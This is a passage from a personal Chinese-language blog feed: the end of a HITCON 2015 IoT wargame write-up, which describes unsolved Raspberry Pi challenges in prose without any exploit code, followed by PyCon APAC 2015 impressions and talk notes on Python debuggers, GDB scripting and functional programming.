&lt;p&gt;補上直接 dump 的 write-up &lt;a href="http://kb.hitcon.org/post/128246307977/%E7%A7%92%E8%A7%A3-hitcon-nano-%E9%A1%8C"&gt;HITCON Knowledge Base — 秒解 Hitcon Nano 題&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Raspberry Pi 部份&lt;/h2&gt;
&lt;p&gt;有分四題：R0, R1, R2, R4 的題目都不同，都是由 Orange 出題。&lt;br /&gt;
我只有碰 R0 跟 R1 的題目，有些想法，但都沒解出來，以下簡單紀錄。  &lt;/p&gt;
&lt;h3&gt;R0&lt;/h3&gt;
&lt;p&gt;Web 那邊會拿到一個 &lt;a href="/files/hitcon-2015-iot-wargame/rpi/r0/forkyou"&gt;ARM64 的 binary 執行檔&lt;/a&gt;，&lt;br /&gt;
之後用 &lt;code&gt;qemu-aarch64&lt;/code&gt; 的環境就可以執行，&lt;br /&gt;
聽說還蠻簡單的，可是我還是解不出來QQ&lt;br /&gt;
似乎有在某處看到 &lt;code&gt;/bin/sh -c&lt;/code&gt; 之類的呼叫，&lt;br /&gt;
應該是利用 BOF 把 EIP 指到那邊就可以拿到 shell 了?  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;補上 R0 write-up &lt;a href="http://kb.hitcon.org/post/127947378507/hitcon-2015-iot-wargame-r0-%E6%8C%91%E6%88%B0%E9%A1%8C"&gt;HITCON Knowledge Base — HITCON 2015 IoT Wargame – R0 挑戰題&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;R1&lt;/h3&gt;
&lt;p&gt;連進去是 Discuz! X3.2&lt;br /&gt;
查了一下，有 remote shell execute 漏洞:&lt;br /&gt;
&lt;a href="http://drops.wooyun.org/papers/4611"&gt;DiscuzX系列命令执行分析公开（三连弹） | WooYun知识库&lt;/a&gt;&lt;br /&gt;
照著做之後，&lt;br /&gt;
找不到在 &lt;code&gt;data/attachment&lt;/code&gt; 底下符合權限的圖片來編輯，&lt;br /&gt;
(最近重灌，還沒裝 DirBuster 或是 Burp Suite，所以沒暴力掃底下有哪些東西...)&lt;br /&gt;
無法觸發 picwidth 的 Remote Shell Excution 漏洞，&lt;br /&gt;
感覺方向應該是對的吧？&lt;br /&gt;
這題是四題裏面沒被人解出來的。&lt;br /&gt;
(GeoHot 把其他三題都解掉了...)  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;這次的 Wargame 大概就是這樣吧，&lt;br /&gt;
果然實力還是不夠，&lt;br /&gt;
HST 的 Wargame 拿到 reversed.txt 裡頭一串 ...---.. 後也沒啥想法。  &lt;/p&gt;
&lt;p&gt;會把 Nano 的部份寫的這麼詳細的原因，&lt;br /&gt;
是因為想要推廣大家玩一下 Wargame 吧！&lt;br /&gt;
(覺得有趣的話就可以來打 CTF 了)&lt;br /&gt;
畢竟上面也講了，這次 Wargame 真的不算難，&lt;br /&gt;
而將近 1000 人的會眾，只有不到 300 人註冊，只有 161 人有拿到分，&lt;br /&gt;
這比例實在有點少。&lt;br /&gt;
再加上幾天前在 Facebook 上看到有人說 Nano 一片一片燒，燒到手快斷了，&lt;br /&gt;
覺得這麼少人玩實在有點可惜。  &lt;/p&gt;
&lt;p&gt;處理好 Arduino Nano 跟電腦連接之後，&lt;br /&gt;
基本上就是寫 Python Code，&lt;br /&gt;
所以我才戲稱是 Python Wargame，&lt;br /&gt;
但其實沒學過 Python 的人藉著這個機會學一下 Python 也不錯，&lt;br /&gt;
畢竟因為 Python 的方便性，很多 exploit 都用 Python 寫了。  &lt;/p&gt;
&lt;p&gt;總之，這篇就是一個小廢物的流水帳。&lt;br /&gt;
有問題歡迎留言討論，但我不一定會就是T_T。  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Thu, 03 Sep 2015 21:32:19 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2015-08-29:posts/2015/08/29/hitcon-2015-iot-wargame/</guid><category>CTF</category><category>HITCON</category><category>Arduino</category><category>Python</category><category>Raspberry Pi</category><category>Write-up</category><category>Conf</category></item><item><title>PyCon APAC 2015 Notes and Thoughts</title><link>https://blog.m157q.tw/posts/2015/07/26/pycon-apac-2015-notes-and-thoughts/</link><description>&lt;p&gt;這次是第二次參加 PyCon，&lt;br /&gt;
與其像去年當個沒做事的 Web 組冗員，&lt;br /&gt;
還是乖乖當個會眾就好，&lt;br /&gt;
但還是有義務幫忙一些簡單的小事啦。  &lt;/p&gt;
&lt;p&gt;相較於上次參加，&lt;br /&gt;
這一年中也對 Python 更加瞭解了一些，&lt;br /&gt;
但仍然有很多地方不足，&lt;br /&gt;
但至少今年的議程中，&lt;br /&gt;
能夠聽懂的議程比較多了。  &lt;/p&gt;
&lt;p&gt;今年的議程中，&lt;br /&gt;
感覺偏硬的講題變多了，&lt;br /&gt;
似乎是件好事，&lt;br /&gt;
不然很多人提到 Python 都覺得只有 Django, Flask, Bottle, Tornado, ... 之類的 Web 應用&lt;br /&gt;
或是 Numpy, Scipy 之類的科學運算。&lt;br /&gt;
其實 Security 的部分也越來越常看見 exploit 是用 Python 寫的，&lt;br /&gt;
只是可能比較難在 PyCon 出現吧，&lt;br /&gt;
應該都出現在 HITCON。&lt;br /&gt;
但今年的講題真的是比去年還富有多樣性就是。  &lt;/p&gt;
&lt;p&gt;而今年印象最深刻的議程是 Scott Tsai 講 GDB 掛 Python hook 做 Debug 那場，&lt;br /&gt;
講者的英文在我耳裡聽起來跟 native speaker 一樣， 非常流利。&lt;br /&gt;
現場直接 Live Demo 也非常嫻熟，真的很厲害。  &lt;/p&gt;
&lt;p&gt;除了議程之外，最讓我印象深刻的絕對是第二天晚上的夜市。  &lt;/p&gt;
&lt;p&gt;晚餐的自助吧菜色非常多，可以吃得很飽。&lt;br /&gt;
再加上很棒的管樂隊演奏（宇宙戰艦大和號、龍貓、...），&lt;br /&gt;
還有其他的音樂表演，然後各個攤位自己舉辦的各種活動。  &lt;/p&gt;
&lt;p&gt;因為一開始就被拉去 Code Fight 的攤位，&lt;br /&gt;
然後跟 dv 被抓去當第一題的白老鼠，還被拍了照，&lt;br /&gt;
然後就一直待在那邊玩，所以印象最深的也只有 Code Fight。&lt;br /&gt;
結果我跟 dv 很糗的第一題都沒在時間內解出來，還在那邊耗很久的時間，&lt;br /&gt;
用別人的電腦真的很不習慣啊！&lt;br /&gt;
好吧，其實只是太廢的藉口，回去得多練練功。&lt;br /&gt;
但這活動真的很有趣，一堆工程師宅宅在現場解題目，玩得不亦樂乎，希望明年還會有。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="code fight" src="/files/pycon-apac-2015-notes-and-thoughts/code-fight.jpg" /&gt;&lt;br /&gt;
source: &lt;a href="https://www.facebook.com/photo.php?fbid=10206661768324121&amp;amp;set=a.1209323314476.2032355.1270526425&amp;amp;type=1"&gt;https://www.facebook.com/photo.php?fbid=10206661768324121&amp;amp;set=a.1209323314476.2032355.1270526425&amp;amp;type=1&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;附上 Code Fight 的 GitHub Repo (有興趣的人可以去貢獻題目XD)  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/ccwang002/pyapac_code_fighter"&gt;ccwang002/pyapac_code_fighter · GitHub&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Badge System &amp;amp; Bingo 令我印象深刻的程度僅次於 Night Party。  &lt;/p&gt;
&lt;p&gt;由於今年的 Badge 是 RFID card，&lt;br /&gt;
在各個廠商攤位以及會議室的門口都有 RPi 做好的 RFID Reader，&lt;br /&gt;
會眾到贊助廠商的攤位可以 Check-in，&lt;br /&gt;
一方面是讓廠商得到你的 email，之後可以寄送一些廣告或者是徵才訊息給你，&lt;br /&gt;
另一方面是官方做了一個&lt;a href="http://www.codeme.cc/pycon/badges/?kktix=2015"&gt;Badge System&lt;/a&gt;，&lt;br /&gt;
每個廠商的攤位 Check-in 都會有成就可以解鎖，&lt;br /&gt;
而每場議程也都可以 Check-in，&lt;br /&gt;
然後根據解鎖的成就數量，會影響到最後一天 Bingo 活動起始的格子數。  &lt;/p&gt;
&lt;p&gt;因為我解鎖了不少成就，&lt;br /&gt;
所以在最後一天的 Bingo 活動中幸運的得到了 PyCarm 一年份的序號，&lt;br /&gt;
雖然平常還是都在用 Vim 就是。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="pycharm" src="/files/pycon-apac-2015-notes-and-thoughts/pycharm.jpg" /&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;順帶一提，PyCharm 攤位送的贈品是溜溜球，讓人有種回味童年的感覺  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;PyCon 真的每年都有不一樣的東西，&lt;br /&gt;
除了上面提到的 Night Party 跟 Bingo 以外，&lt;br /&gt;
其實會場的佈置也很棒，&lt;br /&gt;
現場有一個超級長的橫向時間軸海報，&lt;br /&gt;
上面記錄了跟 Python 相關的許多重大事件，&lt;br /&gt;
然後附上便利貼和筆，讓會眾可以在海報上面留言，&lt;br /&gt;
我只有拍下 PyCon 2015 的部分。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="poster" src="/files/pycon-apac-2015-notes-and-thoughts/poster.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;然後還有今年的穿梭時空的飛車的看板，&lt;br /&gt;
可以給人拍照用XD  &lt;/p&gt;
&lt;p&gt;&lt;img alt="signboard" src="/files/pycon-apac-2015-notes-and-thoughts/signboard.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;還有餐點也真的很棒  &lt;/p&gt;
&lt;p&gt;&lt;img alt="meal" src="/files/pycon-apac-2015-notes-and-thoughts/meal.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;因為工作人員幾乎都是上班族，&lt;br /&gt;
所以都是用下班或是假日的時間義務幫忙，&lt;br /&gt;
真的很感謝他們辛苦的籌備！  &lt;/p&gt;
&lt;p&gt;喔 對了 因為今年 irc channel 真的是有夠冷清&lt;br /&gt;
所以官方開了個 gitter 代替 irc 的聊天功能&lt;br /&gt;
想看聊天記錄的人可以去看看&lt;br /&gt;
&lt;a href="https://gitter.im/pycontw/pyconapac2015"&gt;https://gitter.im/pycontw/pyconapac2015&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;心得就是上面的部分啦&lt;br /&gt;
以下是三天議程中我自己紀錄的筆記，附上 Hackpad 共筆連結：  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Date: 2015/06/05 - 2015/06/07&lt;br /&gt;
&lt;a href="https://hackpad.com/Slides-of-PyCon-APAC-2015-xyLGxKpDgwP"&gt;Slides of PyCon APAC 2015 - hackpad.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Day 1 - 2015/06/05 - Fri&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/PyCon-APAC-2015-Day-1-June-5-Tt8wwkILDX0"&gt;PyCon APAC 2015 - Day 1 (June 5) - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Ecosystem Threats to Python - Van Lindberg&lt;/h4&gt;
&lt;p&gt;Python is 25 years old.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Python Ecosystem  &lt;ul&gt;
&lt;li&gt;2014 - Ranking of the programing language, took from stackoverflow, github  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Perl vs Python - from 2004 - 2013  &lt;ul&gt;
&lt;li&gt;Perl down, Python up.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The transistion from Python2 to Python3  &lt;/li&gt;
&lt;li&gt;Threats  &lt;ul&gt;
&lt;li&gt;Java  &lt;/li&gt;
&lt;li&gt;nodejs  &lt;/li&gt;
&lt;li&gt;go  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;I cannot interoperate  &lt;ul&gt;
&lt;li&gt;I see dead code.  &lt;/li&gt;
&lt;li&gt;Fortran, C, Cpp  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Django sucks in DjangoCon  &lt;/li&gt;
&lt;li&gt;Let's talk about Java, Why Java?  &lt;ul&gt;
&lt;li&gt;The corporate machine  &lt;/li&gt;
&lt;li&gt;The JVM  &lt;/li&gt;
&lt;li&gt;The Apache Software Foundation  &lt;/li&gt;
&lt;li&gt;Android  &lt;/li&gt;
&lt;li&gt;Big Data  &lt;/li&gt;
&lt;li&gt;..., Acceptable hackerness  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Javasciprt?  &lt;ul&gt;
&lt;li&gt;Ubiquity  &lt;/li&gt;
&lt;li&gt;Gmail  &lt;/li&gt;
&lt;li&gt;Chrome and Virtual Machine race  &lt;ul&gt;
&lt;li&gt;V8  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Javascript, the Good Parts  &lt;/li&gt;
&lt;li&gt;Evented / Async from the ground up  &lt;/li&gt;
&lt;li&gt;JSON  &lt;/li&gt;
&lt;li&gt;..., Acceptable hackerness  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Go  &lt;ul&gt;
&lt;li&gt;static binary  &lt;/li&gt;
&lt;li&gt;bottom up for multi-core use  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Go?  &lt;ul&gt;
&lt;li&gt;Rob Pike and Google  &lt;/li&gt;
&lt;li&gt;Pragmatic, small, "fits your brain"  &lt;/li&gt;
&lt;li&gt;Channels and Goroutines  &lt;ul&gt;
&lt;li&gt;centrate all CPUs  &lt;/li&gt;
&lt;li&gt;right now in Python we don't have this feature.  &lt;ul&gt;
&lt;li&gt;Pypy  &lt;/li&gt;
&lt;li&gt;libsvm  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Performance  &lt;ul&gt;
&lt;li&gt;Python was created for simple using, but go focus on multi-core and performance  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;High level datatypes  &lt;/li&gt;
&lt;li&gt;gofmt  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://golang.org/cmd/gofmt/"&gt;https://golang.org/cmd/gofmt/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;go run  &lt;/li&gt;
&lt;li&gt;Deployment  &lt;/li&gt;
&lt;li&gt;Speed  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python  &lt;ul&gt;
&lt;li&gt;Let's talk about what we are doing wrong  &lt;/li&gt;
&lt;li&gt;Multi-core, package managemnet  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why Python?  &lt;ul&gt;
&lt;li&gt;Broad Ecosystem  &lt;ul&gt;
&lt;li&gt;ruby - bind with rails  &lt;/li&gt;
&lt;li&gt;go - small group of UNIX servers  &lt;/li&gt;
&lt;li&gt;python - it's hard to say where python it is, it's everywhere.  &lt;ul&gt;
&lt;li&gt;Every Movie, single media stream today, used Python.  &lt;/li&gt;
&lt;li&gt;Huge strike in the scientific computing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pragmatic, "fits your brain"  &lt;/li&gt;
&lt;li&gt;Teaching language  &lt;/li&gt;
&lt;li&gt;The PyPy R&amp;amp;D division  &lt;/li&gt;
&lt;li&gt;Python 3  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python is not just a language, Python is the Python Community.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;When programming functionally in Python - Apua Juan&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Theory in Functional Programming  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.cs.kent.ac.uk/people/staff/dat/miranda/whyfp90.pdf"&gt;Why Functional Programming Matters&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generator Failure?  &lt;ul&gt;
&lt;li&gt;Range object vs Generator  &lt;/li&gt;
&lt;li&gt;這兩個是不一樣的東西，generator 就是跑過就沒了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Coroutine  &lt;ul&gt;
&lt;li&gt;Example in Python Official Document  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;List comprehension from Haskell  &lt;ul&gt;
&lt;li&gt;lambda function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python doesn't provide...  &lt;ul&gt;
&lt;li&gt;Algebraic Data Type? Recursive Data Type? Parametric or generic  &lt;ul&gt;
&lt;li&gt;Class 無助於產生 ADT  &lt;/li&gt;
&lt;li&gt;meta-class 可以，但不完全，還是得定義給了什麼 Class  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Pattern Matching  &lt;ul&gt;
&lt;li&gt;_, a = abc(*data)  &lt;/li&gt;
&lt;li&gt;這方面的支援不夠好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Type Class  &lt;ul&gt;
&lt;li&gt;Type Class is NOT "Class"  &lt;/li&gt;
&lt;li&gt;Another form of data abstraction  &lt;/li&gt;
&lt;li&gt;More abstract than ADT  &lt;/li&gt;
&lt;li&gt;It is the abc (Abstract Base Class) in Python  &lt;ul&gt;
&lt;li&gt;Django 大量的使用了 abc  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Monad  &lt;ul&gt;
&lt;li&gt;keyword "Maybe" in Haskell  &lt;/li&gt;
&lt;li&gt;Container, Function for Container  &lt;/li&gt;
&lt;li&gt;Monadic  &lt;ul&gt;
&lt;li&gt;開了個檔案，但是使用 read mode, 並對該 fd 做寫入, 不應該改動  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Type System  &lt;ul&gt;
&lt;li&gt;Python use Duck Typing, so we basically don't use specific type.  &lt;/li&gt;
&lt;li&gt;Annotation for type checking in the future Python  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Generic Function  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;fcn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="o"&gt;---&lt;/span&gt;  
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;fcn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="o"&gt;...&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Python lacks somthing in Functional Programming  &lt;ul&gt;
&lt;li&gt;imperative vs declarative  &lt;/li&gt;
&lt;li&gt;interpreted vs compiled  &lt;/li&gt;
&lt;li&gt;dynamic typed vs static typed  &lt;/li&gt;
&lt;li&gt;Python 基本上偏左邊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Python Debugger Uncovered - Dmitry Trofimov&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;about this talk  &lt;ul&gt;
&lt;li&gt;how to trace Python programs  &lt;/li&gt;
&lt;li&gt;show implementation of a Python Debugger  &lt;/li&gt;
&lt;li&gt;lots of code  &lt;/li&gt;
&lt;li&gt;PyDev  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python debuggers  &lt;ul&gt;
&lt;li&gt;Implemented in Python  &lt;ul&gt;
&lt;li&gt;pdb, PyCharm, Pydev  &lt;/li&gt;
&lt;li&gt;platform independent: CPython, Jython, PyPy, IronPython  &lt;/li&gt;
&lt;li&gt;Can be broken by user code (can be prevented by tricky fixes)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Implemented in C  &lt;ul&gt;
&lt;li&gt;winpdb, Wing, gdb(with Python mappings)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tracing Python code with Python  &lt;ul&gt;
&lt;li&gt;sys.settrace(tracefunc)  &lt;ul&gt;
&lt;li&gt;call, line, reutrn, c_call, c_return, c_exception  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Simple Trace Function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;tracefunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt; on #&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt; % (event, frame.f_lineno))  &lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;tracefunc&lt;/span&gt;  

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;  

&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;settrace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tracefunc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Let's make simple Python debugger  &lt;ul&gt;
&lt;li&gt;Console Debugger  &lt;/li&gt;
&lt;li&gt;Visual Debugger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protocol  &lt;ul&gt;
&lt;li&gt;every message is a line  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Command Types  &lt;ul&gt;
&lt;li&gt;Set Breakpoint  &lt;/li&gt;
&lt;li&gt;Resume  &lt;/li&gt;
&lt;li&gt;Get Threads  &lt;/li&gt;
&lt;li&gt;Get Frame  &lt;/li&gt;
&lt;li&gt;Evaluate Expression  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IDE  &lt;ul&gt;
&lt;li&gt;Creates server socket  &lt;/li&gt;
&lt;li&gt;Launches a script being debugged with a command  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Debugger Main Code  &lt;/li&gt;
&lt;li&gt;Demo  &lt;/li&gt;
&lt;li&gt;Important Features  &lt;ul&gt;
&lt;li&gt;Conditional Breakpoints  &lt;/li&gt;
&lt;li&gt;Exception Breakpoint  &lt;/li&gt;
&lt;li&gt;Step Over / Step Into / Run to Line  &lt;/li&gt;
&lt;li&gt;PYthon 2.4 to Python 3.4  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.python.org/moin/PythonDebuggers"&gt;https://wiki.python.org/moin/PythonDebuggers&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;Programmatic Debugging with GDB and Python - Scott Tsai&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;debug C / C++ code with Python  &lt;/li&gt;
&lt;li&gt;GDB  &lt;ul&gt;
&lt;li&gt;set a Conditional Breakpoint  &lt;/li&gt;
&lt;li&gt;set a Breakpoint that only triggers for a specific thread  &lt;/li&gt;
&lt;li&gt;Debug multiple process  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Getting a Python Prompt in GDB  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb  
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; python-interactive  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;GDB Embedding IPython  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(In some .py file)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;IPython&lt;/span&gt;  
&lt;span class="n"&gt;IPython&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;embed_kernel&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;(In some shell)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb -x gdb-ipython.py  
$ ipython3 console kernel-xxx.json  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gdb -q /bin/true  
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; start  
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; python-interactive  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;How Source Level Debugging works?  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;gcc -g&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;eu-strip -f xxx.debug xxx&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;eu-strip - split debug info  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Do my binaries have debug info?  &lt;ul&gt;
&lt;li&gt;Look for the .debug_info section  &lt;/li&gt;
&lt;li&gt;.gnu_debuglink  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DWARF ELF Sections  &lt;ul&gt;
&lt;li&gt;.debug_abbrev  &lt;/li&gt;
&lt;li&gt;.debug_info  &lt;/li&gt;
&lt;li&gt;pyelftools  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;pip install pyelftools&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linux Distros Provide Debug Info  &lt;ul&gt;
&lt;li&gt;(Fedora, Red Hat)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;debug-info install $PACKGENAME&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CPython and Numpy has debug info, butt libz.so and other externel libraries don't.  &lt;/li&gt;
&lt;li&gt;Debug multiprocess with gdb  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;set detach-on-fork off  
set traget-async on  
set pagination off  
add-inferior  
...  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Debug Optimized Code  &lt;ul&gt;
&lt;li&gt;use gdb to alter the control flow  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4&gt;The Future of GUI Programming with Python - Tzu-ping Chung&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Tkinter  &lt;ul&gt;
